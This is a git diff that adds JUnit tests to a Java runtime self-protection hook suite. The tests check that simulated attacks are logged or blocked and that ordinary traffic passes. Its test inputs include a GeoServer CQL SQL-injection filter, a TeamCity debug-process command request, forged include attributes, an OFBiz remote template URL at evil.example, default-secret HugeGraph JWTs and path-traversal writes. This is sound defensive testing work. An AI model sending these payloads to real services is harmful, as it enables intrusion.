@@ -8,17 +8,32 @@ import java.beans.Statement;
 import java.io.ByteArrayOutputStream;
 import java.io.InputStream;
 import java.io.ObjectStreamClass;
+import java.net.URI;
 import java.net.URL;
 import java.nio.charset.StandardCharsets;
 import java.nio.file.Files;
 import java.nio.file.Path;
 import java.util.Arrays;
 import java.util.HashMap;
+import java.util.List;
 import java.util.Map;
 import org.junit.jupiter.api.AfterEach;
 import org.junit.jupiter.api.Test;
 
 final class Java11RaspHooksTest {
+  private static final String HUGEGRAPH_DEFAULT_JWT =
+      "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9."
+          + "eyJ1c2VyX25hbWUiOiJhZG1pbiIsInVzZXJfaWQiOiItMzA6YWRtaW4iLCJleHAiOjk3Mzk1MjM0ODN9."
+          + "mnafQi6x9nlMz1OcPQu4xAyiq91Ig5tUFhGsktNXKqg";
+  private static final String HUGEGRAPH_TAMPERED_JWT =
+      "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9."
+          + "eyJ1c2VyX25hbWUiOiJhZG1pbiIsInVzZXJfaWQiOiItMzA6YWRtaW4iLCJleHAiOjk3Mzk1MjM0ODN9."
+          + "mnafQi6x9nlMz1OcPQu4xAyiq91Ig5tUFhGsktNXKqa";
+  private static final String DATAEASE_WRONG_SIGNATURE_JWT =
+      "eyJhbGciOiJIUzI1NiJ9."
+          + "eyJ1aWQiOjEsIm9pZCI6MSwiZXhwIjo5NzM5NTIzNDgzfQ."
+          + "7zfY8mKIUd0Q6AMp3_hxGNgF-KMkED7vc0PSH5vO4cQ";
+
   @AfterEach
   void clearProperties() {
     System.clearProperty("ohmyrasp.java11.log");
@@ -126,6 +141,26 @@ final class Java11RaspHooksTest {
   }
 
   @Test
+  void blocksJiffleRuntimeCommandStackWhenBlockModeIsEnabled() throws Exception {
+    Path log = Files.createTempFile("ohmyrasp-java11-jiffle-command", ".jsonl");
+    Files.delete(log);
+    System.setProperty("ohmyrasp.java11.log", log.toString());
+    System.setProperty("ohmyrasp.java11.block", "true");
+
+    assertThrows(
+        Java11RaspBlockException.class,
+        () ->
+            it.geosolutions.jaiext.jiffle.runtime.JiffleIndirectRuntimeImpl
+                .invokeJava11JiffleRuntimeCommand());
+
+    String text = new String(Files.readAllBytes(log), StandardCharsets.UTF_8);
+    assertTrue(text.contains("\"algorithm\":\"java11_command_execution_exploit_primitive\""));
+    assertTrue(text.contains("\"action\":\"block\""));
+    assertTrue(text.contains("Jiffle runtime reached a Java 11 process sink"));
+    assertTrue(text.contains("\"command\":\"id\""));
+  }
+
+  @Test
   void ignoresKkFileViewOfficeCleanupCommands() throws Exception {
     Path log = Files.createTempFile("ohmyrasp-java11-office-cleanup", ".jsonl");
     Files.delete(log);
@@ -220,6 +255,44 @@ final class Java11RaspHooksTest {
         .invokeJava11SpringBeanInitLscpuTopology();
     org.springframework.context.support.AbstractApplicationContext
         .invokeJava11SpringBeanInitVcgenTemperature();
+    org.springframework.context.support.AbstractApplicationContext
+        .invokeJava11SpringBeanInitDmidecodeProcessorProbe();
+    org.springframework.context.support.AbstractApplicationContext
+        .invokeJava11SpringBeanInitCpuidProbe();
+    org.springframework.context.support.AbstractApplicationContext
+        .invokeJava11SpringBeanInitOsReleaseProbe();
+    org.springframework.context.support.AbstractApplicationContext
+        .invokeJava11SpringBeanInitLdconfigProbe();
+    org.springframework.context.support.AbstractApplicationContext
+        .invokeJava11SpringBeanInitUnameProbe();
+
+    assertFalse(Files.exists(log));
+  }
+
+  @Test
+  void ignoresIdentityProbeDuringSpringInitialization() throws Exception {
+    Path log = Files.createTempFile("ohmyrasp-java11-spring-id-probe", ".jsonl");
+    Files.delete(log);
+    System.setProperty("ohmyrasp.java11.log", log.toString());
+    System.setProperty("ohmyrasp.java11.block", "true");
+
+    org.springframework.context.support.AbstractApplicationContext
+        .invokeJava11SpringBeanInitIdentityProbe();
+
+    assertFalse(Files.exists(log));
+  }
+
+  @Test
+  void ignoresTeamCityMetadataVerifierDuringSpringInitialization() throws Exception {
+    Path log = Files.createTempFile("ohmyrasp-java11-teamcity-metadata", ".jsonl");
+    Files.delete(log);
+    System.setProperty("ohmyrasp.java11.log", log.toString());
+    System.setProperty("ohmyrasp.java11.block", "true");
+
+    org.springframework.context.support.AbstractApplicationContext
+        .invokeJava11SpringBeanInitTeamCityMetadataVerifier();
+    org.springframework.context.support.AbstractApplicationContext
+        .invokeJava11SpringBeanInitTeamCityServerJarMetadataVerifier();
 
     assertFalse(Files.exists(log));
   }
@@ -340,6 +413,174 @@ final class Java11RaspHooksTest {
   }
 
   @Test
+  void ignoresTeamCityInstallLinksFragmentPathWhenBlockModeIsEnabled() throws Exception {
+    Path log = Files.createTempFile("ohmyrasp-java11-teamcity-installlinks", ".jsonl");
+    Files.delete(log);
+    System.setProperty("ohmyrasp.java11.log", log.toString());
+    System.setProperty("ohmyrasp.java11.block", "true");
+
+    Java11RaspHooks.beforeHttpRequest(
+        new RequestStub("GET", "/admin/../installLinks.jspf", ""));
+    Java11RaspHooks.afterHttpRequest();
+
+    assertFalse(Files.exists(log));
+  }
+
+  @Test
+  void blocksTeamCityDebugProcessLaunchWhenBlockModeIsEnabled() throws Exception {
+    Path log = Files.createTempFile("ohmyrasp-java11-teamcity-debug-process", ".jsonl");
+    Files.delete(log);
+    System.setProperty("ohmyrasp.java11.log", log.toString());
+    System.setProperty("ohmyrasp.java11.block", "true");
+
+    assertThrows(
+        Java11RaspBlockException.class,
+        () ->
+            Java11RaspHooks.beforeHttpRequest(
+                new RequestStub("POST", "/app/rest/debug/processes", "exePath=id")
+                    .withParameter("exePath", "id")));
+
+    String text = new String(Files.readAllBytes(log), StandardCharsets.UTF_8);
+    assertTrue(text.contains("\"algorithm\":\"java11_request_debug_process_launch\""));
+    assertTrue(text.contains("\"action\":\"block\""));
+    assertTrue(text.contains("parameter=exePath"));
+    assertTrue(text.contains("commandLength=2"));
+    assertTrue(text.contains("value=[redacted]"));
+    assertFalse(text.contains("exePath=id"));
+  }
+
+  @Test
+  void ignoresDebugProcessRequestWithoutExecutableParameter() throws Exception {
+    Path log = Files.createTempFile("ohmyrasp-java11-teamcity-debug-normal", ".jsonl");
+    Files.delete(log);
+    System.setProperty("ohmyrasp.java11.log", log.toString());
+    System.setProperty("ohmyrasp.java11.block", "true");
+
+    Java11RaspHooks.beforeHttpRequest(
+        new RequestStub("POST", "/app/rest/debug/processes", "locator=all")
+            .withParameter("locator", "all"));
+    Java11RaspHooks.afterHttpRequest();
+
+    assertFalse(Files.exists(log));
+  }
+
+  @Test
+  void ignoresExecutableParameterOutsideDebugProcessContext() throws Exception {
+    Path log = Files.createTempFile("ohmyrasp-java11-teamcity-debug-outside", ".jsonl");
+    Files.delete(log);
+    System.setProperty("ohmyrasp.java11.log", log.toString());
+    System.setProperty("ohmyrasp.java11.block", "true");
+
+    Java11RaspHooks.beforeHttpRequest(
+        new RequestStub("POST", "/app/rest/builds", "exePath=id")
+            .withParameter("exePath", "id"));
+    Java11RaspHooks.afterHttpRequest();
+
+    assertFalse(Files.exists(log));
+  }
+
+  @Test
+  void blocksTeamCityInternalForwardWhenBlockModeIsEnabled() throws Exception {
+    Path log = Files.createTempFile("ohmyrasp-java11-teamcity-forward-block", ".jsonl");
+    Files.delete(log);
+    System.setProperty("ohmyrasp.java11.log", log.toString());
+    System.setProperty("ohmyrasp.java11.block", "true");
+
+    assertThrows(
+        Java11RaspBlockException.class,
+        () ->
+            Java11RaspHooks.beforeHttpRequest(
+                new RequestStub("GET", "/hax", "jsp=/app/rest/users;.jsp")
+                    .withParameter("jsp", "/app/rest/users;.jsp")));
+
+    String text = new String(Files.readAllBytes(log), StandardCharsets.UTF_8);
+    assertTrue(text.contains("\"algorithm\":\"java11_request_internal_forward\""));
+    assertTrue(text.contains("\"action\":\"block\""));
+    assertTrue(text.contains("target=/app/rest/users;.jsp"));
+  }
+
+  @Test
+  void logsEncodedTeamCityInternalForward() throws Exception {
+    Path log = Files.createTempFile("ohmyrasp-java11-teamcity-forward-encoded", ".jsonl");
+    Files.delete(log);
+    System.setProperty("ohmyrasp.java11.log", log.toString());
+
+    Java11RaspHooks.beforeHttpRequest(
+        new RequestStub("GET", "/hax", "jsp=%2Fapp%2Frest%2Fusers%3B.jsp")
+            .withParameter("jsp", "%2Fapp%2Frest%2Fusers%3B.jsp"));
+
+    String text = new String(Files.readAllBytes(log), StandardCharsets.UTF_8);
+    assertTrue(text.contains("\"algorithm\":\"java11_request_internal_forward\""));
+    assertTrue(text.contains("\"action\":\"log\""));
+    assertTrue(text.contains("target=/app/rest/users;.jsp"));
+  }
+
+  @Test
+  void ignoresInternalForwardWithoutServletSuffixConfusion() throws Exception {
+    Path log = Files.createTempFile("ohmyrasp-java11-teamcity-forward-normal", ".jsonl");
+    Files.delete(log);
+    System.setProperty("ohmyrasp.java11.log", log.toString());
+
+    Java11RaspHooks.beforeHttpRequest(
+        new RequestStub("GET", "/hax", "jsp=/app/rest/users")
+            .withParameter("jsp", "/app/rest/users"));
+
+    assertFalse(Files.exists(log));
+  }
+
+  @Test
+  void logsForgedIncludeProtectedWebResourceAttribute() throws Exception {
+    Path log = Files.createTempFile("ohmyrasp-java11-forged-include", ".jsonl");
+    Files.delete(log);
+    System.setProperty("ohmyrasp.java11.log", log.toString());
+
+    Java11RaspHooks.beforeHttpRequest(
+        new RequestStub("GET", "/asdf", "")
+            .withAttribute("javax.servlet.include.request_uri", "/")
+            .withAttribute("javax.servlet.include.path_info", "WEB-INF/web.xml")
+            .withAttribute("javax.servlet.include.servlet_path", "/"));
+
+    String text = new String(Files.readAllBytes(log), StandardCharsets.UTF_8);
+    assertTrue(text.contains("\"algorithm\":\"java11_request_forged_include_attribute\""));
+    assertTrue(text.contains("\"action\":\"log\""));
+    assertTrue(text.contains("WEB-INF/web.xml"));
+  }
+
+  @Test
+  void blocksForgedIncludeProtectedWebResourceAttributeWhenBlockModeIsEnabled() throws Exception {
+    Path log = Files.createTempFile("ohmyrasp-java11-forged-include-block", ".jsonl");
+    Files.delete(log);
+    System.setProperty("ohmyrasp.java11.log", log.toString());
+    System.setProperty("ohmyrasp.java11.block", "true");
+
+    assertThrows(
+        Java11RaspBlockException.class,
+        () ->
+            Java11RaspHooks.beforeHttpRequest(
+                new RequestStub("GET", "/asdf", "")
+                    .withAttribute("javax.servlet.include.path_info", "WEB-INF/web.xml")));
+
+    String text = new String(Files.readAllBytes(log), StandardCharsets.UTF_8);
+    assertTrue(text.contains("\"algorithm\":\"java11_request_forged_include_attribute\""));
+    assertTrue(text.contains("\"action\":\"block\""));
+  }
+
+  @Test
+  void ignoresRequestDispatcherIncludeAttributes() throws Exception {
+    Path log = Files.createTempFile("ohmyrasp-java11-forged-include-dispatcher", ".jsonl");
+    Files.delete(log);
+    System.setProperty("ohmyrasp.java11.log", log.toString());
+
+    ApplicationDispatcher.include(
+        new RequestStub("GET", "/page", "")
+            .withAttribute("javax.servlet.include.request_uri", "/")
+            .withAttribute("javax.servlet.include.path_info", "WEB-INF/web.xml")
+            .withAttribute("javax.servlet.include.servlet_path", "/"));
+
+    assertFalse(Files.exists(log));
+  }
+
+  @Test
   void logsJettyEncodedDotWebInfDisclosurePath() throws Exception {
     Path log = Files.createTempFile("ohmyrasp-java11-jetty-webinf", ".jsonl");
     Files.delete(log);
@@ -381,6 +622,268 @@ final class Java11RaspHooksTest {
     assertTrue(text.contains("\"algorithm\":\"java11_request_path_confusion\""));
     assertTrue(text.contains("\"action\":\"log\""));
     assertTrue(text.contains("/admin"));
+  }
+
+  @Test
+  void blocksGeoServerCqlFilterSqlInjectionWhenBlockModeIsEnabled() throws Exception {
+    Path log = Files.createTempFile("ohmyrasp-java11-geoserver-cql", ".jsonl");
+    Files.delete(log);
+    System.setProperty("ohmyrasp.java11.log", log.toString());
+    System.setProperty("ohmyrasp.java11.block", "true");
+
+    String filter =
+        "strStartsWith(name,'x'') = true and 1=(SELECT CAST ((SELECT version()) AS integer))"
+            + " -- ') = true";
+
+    assertThrows(
+        Java11RaspBlockException.class,
+        () ->
+            Java11RaspHooks.beforeHttpRequest(
+                new RequestStub(
+                        "GET",
+                        "/geoserver/ows",
+                        "service=wfs&version=1.0.0&request=GetFeature&typeName=vulhub:example")
+                    .withParameter("service", "wfs")
+                    .withParameter("request", "GetFeature")
+                    .withParameter("typeName", "vulhub:example")
+                    .withParameter("CQL_FILTER", filter)));
+
+    String text = new String(Files.readAllBytes(log), StandardCharsets.UTF_8);
+    assertTrue(text.contains("\"algorithm\":\"java11_request_ogc_filter_sql_injection\""));
+    assertTrue(text.contains("\"action\":\"block\""));
+    assertTrue(text.contains("parameter=CQL_FILTER"));
+    assertTrue(text.contains("value=[redacted]"));
+    assertFalse(text.contains("SELECT version"));
+  }
+
+  @Test
+  void ignoresNormalGeoServerCqlFilter() throws Exception {
+    Path log = Files.createTempFile("ohmyrasp-java11-geoserver-cql-normal", ".jsonl");
+    Files.delete(log);
+    System.setProperty("ohmyrasp.java11.log", log.toString());
+    System.setProperty("ohmyrasp.java11.block", "true");
+
+    Java11RaspHooks.beforeHttpRequest(
+        new RequestStub(
+                "GET",
+                "/geoserver/ows",
+                "service=wfs&version=1.0.0&request=GetFeature&typeName=vulhub:example")
+            .withParameter("service", "wfs")
+            .withParameter("request", "GetFeature")
+            .withParameter("typeName", "vulhub:example")
+            .withParameter("CQL_FILTER", "strStartsWith(name,'x') = true"));
+    Java11RaspHooks.afterHttpRequest();
+
+    assertFalse(Files.exists(log));
+  }
+
+  @Test
+  void blocksInternalServiceIdentityOnSensitiveControlPath() throws Exception {
+    Path log = Files.createTempFile("ohmyrasp-java11-internal-identity", ".jsonl");
+    Files.delete(log);
+    System.setProperty("ohmyrasp.java11.log", log.toString());
+    System.setProperty("ohmyrasp.java11.block", "true");
+
+    assertThrows(
+        Java11RaspBlockException.class,
+        () ->
+            Java11RaspHooks.beforeHttpRequest(
+                new RequestStub(
+                        "POST", "/nacos/v1/auth/users", "username=vulhub&password=vulhub")
+                    .withHeader("User-Agent", "Nacos-Server")));
+
+    String text = new String(Files.readAllBytes(log), StandardCharsets.UTF_8);
+    assertTrue(text.contains("\"algorithm\":\"java11_request_internal_identity\""));
+    assertTrue(text.contains("\"action\":\"block\""));
+    assertTrue(text.contains("/nacos/v1/auth/users"));
+  }
+
+  @Test
+  void ignoresInternalServiceIdentityOnNonControlPath() throws Exception {
+    Path log = Files.createTempFile("ohmyrasp-java11-internal-identity-normal", ".jsonl");
+    Files.delete(log);
+    System.setProperty("ohmyrasp.java11.log", log.toString());
+
+    Java11RaspHooks.beforeHttpRequest(
+        new RequestStub("GET", "/nacos/v1/ns/instance/list", "serviceName=demo")
+            .withHeader("User-Agent", "Nacos-Server"));
+
+    assertFalse(Files.exists(log));
+  }
+
+  @Test
+  void ignoresNormalUserAgentOnSensitiveControlPath() throws Exception {
+    Path log = Files.createTempFile("ohmyrasp-java11-internal-identity-user", ".jsonl");
+    Files.delete(log);
+    System.setProperty("ohmyrasp.java11.log", log.toString());
+
+    Java11RaspHooks.beforeHttpRequest(
+        new RequestStub("GET", "/nacos/v1/auth/users", "pageNo=1&pageSize=9")
+            .withHeader("User-Agent", "Mozilla/5.0"));
+
+    assertFalse(Files.exists(log));
+  }
+
+  @Test
+  void logsRemoteTemplateSourceParameterOnControlPath() throws Exception {
+    Path log = Files.createTempFile("ohmyrasp-java11-template-source", ".jsonl");
+    Files.delete(log);
+    System.setProperty("ohmyrasp.java11.log", log.toString());
+
+    Java11RaspHooks.beforeHttpRequest(
+        new RequestStub(
+                "POST",
+                "/webtools/control/forgotPassword/StatsSinceStart",
+                "statsDecoratorLocation=http%3A%2F%2Fevil.example%2Fofbiz%2Fpayload.xml")
+            .withParameter(
+                "statsDecoratorLocation", "http://evil.example/ofbiz/payload.xml"));
+
+    String text = new String(Files.readAllBytes(log), StandardCharsets.UTF_8);
+    assertTrue(text.contains("\"algorithm\":\"java11_request_template_source\""));
+    assertTrue(text.contains("\"action\":\"log\""));
+    assertTrue(text.contains("parameter=statsDecoratorLocation"));
+    assertTrue(text.contains("target=remote-url"));
+    assertFalse(text.contains("evil.example"));
+  }
+
+  @Test
+  void ignoresRemoteTemplateSourceParameterOutsideControlPath() throws Exception {
+    Path log = Files.createTempFile("ohmyrasp-java11-template-source-normal", ".jsonl");
+    Files.delete(log);
+    System.setProperty("ohmyrasp.java11.log", log.toString());
+
+    Java11RaspHooks.beforeHttpRequest(
+        new RequestStub("POST", "/api/preferences", "")
+            .withParameter(
+                "statsDecoratorLocation", "http://evil.example/ofbiz/payload.xml"));
+
+    assertFalse(Files.exists(log));
+  }
+
+  @Test
+  void blocksRemoteTemplateSourceParameterWhenBlockModeIsEnabled() throws Exception {
+    Path log = Files.createTempFile("ohmyrasp-java11-template-source-block", ".jsonl");
+    Files.delete(log);
+    System.setProperty("ohmyrasp.java11.log", log.toString());
+    System.setProperty("ohmyrasp.java11.block", "true");
+
+    assertThrows(
+        Java11RaspBlockException.class,
+        () ->
+            Java11RaspHooks.beforeHttpRequest(
+                new RequestStub(
+                        "POST",
+                        "/webtools/control/forgotPassword/StatsSinceStart",
+                        "")
+                    .withParameter(
+                        "statsDecoratorLocation", "http://evil.example/ofbiz/payload.xml")));
+
+    String text = new String(Files.readAllBytes(log), StandardCharsets.UTF_8);
+    assertTrue(text.contains("\"algorithm\":\"java11_request_template_source\""));
+    assertTrue(text.contains("\"action\":\"block\""));
+  }
+
+  @Test
+  void blocksDefaultJwtSecretBearerTokenWhenBlockModeIsEnabled() throws Exception {
+    Path log = Files.createTempFile("ohmyrasp-java11-default-jwt", ".jsonl");
+    Files.delete(log);
+    System.setProperty("ohmyrasp.java11.log", log.toString());
+    System.setProperty("ohmyrasp.java11.block", "true");
+
+    assertThrows(
+        Java11RaspBlockException.class,
+        () ->
+            Java11RaspHooks.beforeHttpRequest(
+                new RequestStub("GET", "/graphs", "")
+                    .withHeader("Authorization", "Bearer " + HUGEGRAPH_DEFAULT_JWT)));
+
+    String text = new String(Files.readAllBytes(log), StandardCharsets.UTF_8);
+    assertTrue(text.contains("\"algorithm\":\"java11_request_default_jwt_secret\""));
+    assertTrue(text.contains("\"action\":\"block\""));
+    assertTrue(text.contains("hugegraph-default-token-secret"));
+    assertFalse(text.contains(HUGEGRAPH_DEFAULT_JWT));
+  }
+
+  @Test
+  void blocksDefaultJwtSecretBearerTokenFromJaxRsRequestWhenBlockModeIsEnabled()
+      throws Exception {
+    Path log = Files.createTempFile("ohmyrasp-java11-default-jwt-jaxrs", ".jsonl");
+    Files.delete(log);
+    System.setProperty("ohmyrasp.java11.log", log.toString());
+    System.setProperty("ohmyrasp.java11.block", "true");
+
+    assertThrows(
+        Java11RaspBlockException.class,
+        () ->
+            Java11RaspHooks.beforeHttpRequest(
+                new JaxRsRequestStub("GET", "http://127.0.0.1:8080/graphs?format=json")
+                    .withHeader("Authorization", "Bearer " + HUGEGRAPH_DEFAULT_JWT)));
+
+    String text = new String(Files.readAllBytes(log), StandardCharsets.UTF_8);
+    assertTrue(text.contains("\"algorithm\":\"java11_request_default_jwt_secret\""));
+    assertTrue(text.contains("\"action\":\"block\""));
+    assertTrue(text.contains("/graphs"));
+    assertFalse(text.contains(HUGEGRAPH_DEFAULT_JWT));
+  }
+
+  @Test
+  void ignoresBearerJwtWithUnknownSignature() throws Exception {
+    Path log = Files.createTempFile("ohmyrasp-java11-default-jwt-normal", ".jsonl");
+    Files.delete(log);
+    System.setProperty("ohmyrasp.java11.log", log.toString());
+
+    Java11RaspHooks.beforeHttpRequest(
+        new RequestStub("GET", "/graphs", "")
+            .withHeader("Authorization", "Bearer " + HUGEGRAPH_TAMPERED_JWT));
+
+    assertFalse(Files.exists(log));
+  }
+
+  @Test
+  void blocksJwtVerificationFailureContinuationWhenBlockModeIsEnabled() throws Exception {
+    Path log = Files.createTempFile("ohmyrasp-java11-jwt-verification-failure", ".jsonl");
+    Files.delete(log);
+    System.setProperty("ohmyrasp.java11.log", log.toString());
+    System.setProperty("ohmyrasp.java11.block", "true");
+
+    Java11RaspHooks.beforeHttpRequest(
+        new RequestStub("GET", "/de2api/user/info", "")
+            .withHeader("X-DE-TOKEN", DATAEASE_WRONG_SIGNATURE_JWT));
+    try {
+      assertThrows(
+          Java11RaspBlockException.class,
+          () ->
+              Java11RaspHooks.beforeJwtVerificationFailure(
+                  DATAEASE_WRONG_SIGNATURE_JWT,
+                  new com.auth0.jwt.exceptions.SignatureVerificationException("bad signature")));
+    } finally {
+      Java11RaspHooks.afterHttpRequest();
+    }
+
+    String text = new String(Files.readAllBytes(log), StandardCharsets.UTF_8);
+    assertTrue(text.contains("\"algorithm\":\"java11_request_jwt_verification_failure\""));
+    assertTrue(text.contains("\"action\":\"block\""));
+    assertTrue(text.contains("source=X-DE-TOKEN"));
+    assertTrue(text.contains("SignatureVerificationException"));
+    assertFalse(text.contains(DATAEASE_WRONG_SIGNATURE_JWT));
+  }
+
+  @Test
+  void ignoresJwtVerificationFailureWithoutRequestToken() throws Exception {
+    Path log = Files.createTempFile("ohmyrasp-java11-jwt-verification-quiet", ".jsonl");
+    Files.delete(log);
+    System.setProperty("ohmyrasp.java11.log", log.toString());
+
+    Java11RaspHooks.beforeHttpRequest(new RequestStub("GET", "/de2api/user/info", ""));
+    try {
+      Java11RaspHooks.beforeJwtVerificationFailure(
+          DATAEASE_WRONG_SIGNATURE_JWT,
+          new com.auth0.jwt.exceptions.SignatureVerificationException("bad signature"));
+    } finally {
+      Java11RaspHooks.afterHttpRequest();
+    }
+
+    assertFalse(Files.exists(log));
   }
 
   @Test
@@ -431,6 +934,51 @@ final class Java11RaspHooksTest {
         new RequestStub("GET", "/", "", new CookieStub("rememberMe", "ordinary-user-token")));
 
     assertFalse(Files.exists(log));
+  }
+
+  @Test
+  void logsFilesystemShapedJsessionid() throws Exception {
+    Path log = Files.createTempFile("ohmyrasp-java11-session-file", ".jsonl");
+    Files.delete(log);
+    System.setProperty("ohmyrasp.java11.log", log.toString());
+
+    Java11RaspHooks.beforeHttpRequest(
+        new RequestStub("GET", "/", "", new CookieStub("JSESSIONID", ".deserialize")));
+
+    String text = new String(Files.readAllBytes(log), StandardCharsets.UTF_8);
+    assertTrue(text.contains("\"algorithm\":\"java11_request_session_file_deserialization\""));
+    assertTrue(text.contains("\"action\":\"log\""));
+    assertTrue(text.contains("hidden-file-session-id"));
+  }
+
+  @Test
+  void ignoresOrdinaryJsessionidRouteSuffix() throws Exception {
+    Path log = Files.createTempFile("ohmyrasp-java11-session-file-normal", ".jsonl");
+    Files.delete(log);
+    System.setProperty("ohmyrasp.java11.log", log.toString());
+
+    Java11RaspHooks.beforeHttpRequest(
+        new RequestStub("GET", "/", "", new CookieStub("JSESSIONID", "abc123.node1")));
+
+    assertFalse(Files.exists(log));
+  }
+
+  @Test
+  void blocksFilesystemShapedJsessionidWhenBlockModeIsEnabled() throws Exception {
+    Path log = Files.createTempFile("ohmyrasp-java11-session-file-block", ".jsonl");
+    Files.delete(log);
+    System.setProperty("ohmyrasp.java11.log", log.toString());
+    System.setProperty("ohmyrasp.java11.block", "true");
+
+    assertThrows(
+        Java11RaspBlockException.class,
+        () ->
+            Java11RaspHooks.beforeHttpRequest(
+                new RequestStub("GET", "/", "", new CookieStub("JSESSIONID", ".deserialize"))));
+
+    String text = new String(Files.readAllBytes(log), StandardCharsets.UTF_8);
+    assertTrue(text.contains("\"algorithm\":\"java11_request_session_file_deserialization\""));
+    assertTrue(text.contains("\"action\":\"block\""));
   }
 
   @Test
@@ -643,6 +1191,21 @@ final class Java11RaspHooksTest {
   }
 
   @Test
+  void ignoresTeamCityBundledPluginUnpackDuringStartup() throws Exception {
+    Path log = Files.createTempFile("ohmyrasp-java11-teamcity-plugin", ".jsonl");
+    Files.delete(log);
+    System.setProperty("ohmyrasp.java11.log", log.toString());
+    System.setProperty("ohmyrasp.java11.block", "true");
+
+    jetbrains.buildServer.web.impl.BuildServerConfigurator.invokeJava11BundledPluginUnpack(
+        "/opt/teamcity/webapps/ROOT/WEB-INF/plugins/.unpacked/GitLabIssues/server/TeamCity.GitLabIssues-server-1.0-SNAPSHOT.jar");
+    jetbrains.buildServer.web.impl.BuildServerConfigurator.invokeJava11PluginResourceUnpack(
+        "/opt/teamcity/webapps/ROOT/plugins/artifactsSizeStatistics/suggestions/artifactsSizeDrop.jsp");
+
+    assertFalse(Files.exists(log));
+  }
+
+  @Test
   void logsSensitiveFileRead() throws Exception {
     Path log = Files.createTempFile("ohmyrasp-java11-file-read", ".jsonl");
     Files.delete(log);
@@ -671,6 +1234,22 @@ final class Java11RaspHooksTest {
   }
 
   @Test
+  void logsRelativeJavaWebappScriptFileWrite() throws Exception {
+    Path log = Files.createTempFile("ohmyrasp-java11-file-relative-webapp-write", ".jsonl");
+    Files.delete(log);
+    System.setProperty("ohmyrasp.java11.log", log.toString());
+
+    Java11RaspHooks.beforeFileWrite("./applications/accounting/webapp/accounting/index.jsp");
+
+    String text = new String(Files.readAllBytes(log), StandardCharsets.UTF_8);
+    assertTrue(text.contains("\"algorithm\":\"java11_file_script_write\""));
+    assertTrue(text.contains("\"action\":\"log\""));
+    assertTrue(
+        text.contains(
+            "\"path\":\"./applications/accounting/webapp/accounting/index.jsp\""));
+  }
+
+  @Test
   void logsTraversalExecutableFileWrite() throws Exception {
     Path log = Files.createTempFile("ohmyrasp-java11-file-traversal-write", ".jsonl");
     Files.delete(log);
@@ -682,6 +1261,34 @@ final class Java11RaspHooksTest {
     assertTrue(text.contains("\"algorithm\":\"java11_file_script_write\""));
     assertTrue(text.contains("\"action\":\"log\""));
     assertTrue(text.contains("\"path\":\"/tmp/flink-upload/../../tmp/evil.jar\""));
+  }
+
+  @Test
+  void logsTeamCityPluginJarWriteOutsideStartupStack() throws Exception {
+    Path log = Files.createTempFile("ohmyrasp-java11-teamcity-plugin-direct", ".jsonl");
+    Files.delete(log);
+    System.setProperty("ohmyrasp.java11.log", log.toString());
+
+    Java11RaspHooks.beforeFileWrite(
+        "/opt/teamcity/webapps/ROOT/WEB-INF/plugins/.unpacked/evil/server/Evil.jar");
+
+    String text = new String(Files.readAllBytes(log), StandardCharsets.UTF_8);
+    assertTrue(text.contains("\"algorithm\":\"java11_file_script_write\""));
+    assertTrue(text.contains("\"action\":\"log\""));
+  }
+
+  @Test
+  void logsTeamCityPluginJspWriteOutsideStartupStack() throws Exception {
+    Path log = Files.createTempFile("ohmyrasp-java11-teamcity-plugin-jsp-direct", ".jsonl");
+    Files.delete(log);
+    System.setProperty("ohmyrasp.java11.log", log.toString());
+
+    Java11RaspHooks.beforeFileWrite(
+        "/opt/teamcity/webapps/ROOT/plugins/artifactsSizeStatistics/suggestions/artifactsSizeDrop.jsp");
+
+    String text = new String(Files.readAllBytes(log), StandardCharsets.UTF_8);
+    assertTrue(text.contains("\"algorithm\":\"java11_file_script_write\""));
+    assertTrue(text.contains("\"action\":\"log\""));
   }
 
   @Test
@@ -735,6 +1342,36 @@ final class Java11RaspHooksTest {
     assertThrows(
         Java11RaspBlockException.class,
         () -> Java11RaspHooks.beforeUrlOpen(new URL("http://127.0.0.1:8080/actuator/env")));
+
+    String text = new String(Files.readAllBytes(log), StandardCharsets.UTF_8);
+    assertTrue(text.contains("\"algorithm\":\"java11_ssrf_loopback_admin\""));
+    assertTrue(text.contains("\"action\":\"block\""));
+  }
+
+  @Test
+  void ignoresDataEaseApisixStartupProbe() throws Exception {
+    Path log = Files.createTempFile("ohmyrasp-java11-dataease-apisix-startup", ".jsonl");
+    Files.delete(log);
+    System.setProperty("ohmyrasp.java11.log", log.toString());
+    System.setProperty("ohmyrasp.java11.block", "true");
+
+    io.dataease.xpack.permissions.apisix.manage.XpackRouteManage.checkApisixUpstreams();
+
+    assertFalse(Files.exists(log));
+  }
+
+  @Test
+  void blocksDataEaseApisixAdminUrlOutsideStartupStack() throws Exception {
+    Path log = Files.createTempFile("ohmyrasp-java11-dataease-apisix-direct", ".jsonl");
+    Files.delete(log);
+    System.setProperty("ohmyrasp.java11.log", log.toString());
+    System.setProperty("ohmyrasp.java11.block", "true");
+
+    assertThrows(
+        Java11RaspBlockException.class,
+        () ->
+            Java11RaspHooks.beforeUrlOpen(
+                new URL("http://127.0.0.1:9180/apisix/admin/upstreams")));
 
     String text = new String(Files.readAllBytes(log), StandardCharsets.UTF_8);
     assertTrue(text.contains("\"algorithm\":\"java11_ssrf_loopback_admin\""));
@@ -968,6 +1605,96 @@ final class Java11RaspHooksTest {
   }
 
   @Test
+  void logsSqlIdentifierInjection() throws Exception {
+    Path log = Files.createTempFile("ohmyrasp-java11-sql-identifier", ".jsonl");
+    Files.delete(log);
+    System.setProperty("ohmyrasp.java11.log", log.toString());
+
+    Java11RaspHooks.beforeSqlIdentifier("sqli/**/where/**/1=1--");
+
+    String text = new String(Files.readAllBytes(log), StandardCharsets.UTF_8);
+    assertTrue(text.contains("\"hook\":\"SQL.identifier\""));
+    assertTrue(text.contains("\"algorithm\":\"java11_sql_identifier_injection\""));
+    assertTrue(text.contains("\"action\":\"log\""));
+    assertTrue(text.contains("reason=sql-comment"));
+    assertTrue(text.contains("parameter=metricName"));
+    assertFalse(text.contains("sqli/**/where"));
+  }
+
+  @Test
+  void ignoresNormalSqlIdentifierMetricName() throws Exception {
+    Path log = Files.createTempFile("ohmyrasp-java11-sql-identifier-normal", ".jsonl");
+    Files.delete(log);
+    System.setProperty("ohmyrasp.java11.log", log.toString());
+
+    Java11RaspHooks.beforeSqlIdentifier("service_instance_jvm_memory.max");
+
+    assertFalse(Files.exists(log));
+  }
+
+  @Test
+  void blocksSqlIdentifierInjectionWhenBlockModeIsEnabled() throws Exception {
